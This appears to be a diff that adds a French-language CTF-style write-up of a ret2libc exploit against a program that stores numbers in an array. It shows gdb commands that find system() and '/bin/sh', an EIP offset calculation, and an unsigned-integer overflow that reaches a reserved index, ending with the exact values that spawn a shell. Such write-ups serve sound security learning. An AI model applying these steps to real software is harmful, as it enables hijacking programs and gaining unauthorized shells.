@@ -1,0 +1,53 @@
+C' est un programme qui permet de stocker etlire des nombres, certains index du tableau
+sont recerve et on ne peut pas ecrire directement dedans (tous les multiples de 3 et 0)
+
+Au debut du programme les variables d'environnement sont memset, on peut donc pas 
+stocker de shell code dedans. On va donc faire un ret2libc avec un overwrite de l'eip
+par l'adresse de system() et comme argument "/bin/sh"
+
+Faire un ret2libc : https://beta.hackndo.com/retour-a-la-libc/
+
+
+Pour trouver l'adresse de system il faut mettre un breakpoint sur main et lancer le 
+programme (car system n'est pas utilise de base par le programme). Comme on stocke des
+nombres dans ce tableau, je vais convertir leur adresse hexa en decimal.
+
+p system -> $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+adresse system : 0xf7e6aed0 -> 4159090384
+
+find __libc_start_main,+99999999,"/bin/sh" -> 0xf7f897ec
+x/s 0xf7f897ec
+0xf7f897ec:	 "/bin/sh"
+adresse "/bin/sh" : 0xf7f897ec -> 4160264172
+
+C'est les deux varibles qu'on va devoir stocker dans le tableau. On va devoir overwrite
+l'eip avec l'adresse de system pour prendre le controle du programme et lancer le shell.
+
+
+Pour calculer l'offset de l'eip, je met un breakpoint juste avant de quitter le 
+programme et j'affiche le premier element de la stack:
+b *0x080489f1
+
+(gdb) x/wx $esp
+0xffffd70c:	0xf7e45513
+
+Et un breakpoint sur ma fonction store_number
+(gdb) x $ebp+0x8
+0xffffd520:	0xffffd544
+
+0xffffd70c - 0xffffd544 = 456 
+456 / 4 = 114
+
+Offset de eip = 114
+
+On peut tout de meme stocke des trucs sur les index reserve avec un petit trick qui 
+overflow le veritable index du tableau ?
+
+// On va donc overflow l'uint32
+0xffffffff / 4 + 114 + 1 = 1073741938
+
+Stoker dans le programme:
+4160264172 index 116 
+4159090384 index 1073741938
+
+Puis quitter.
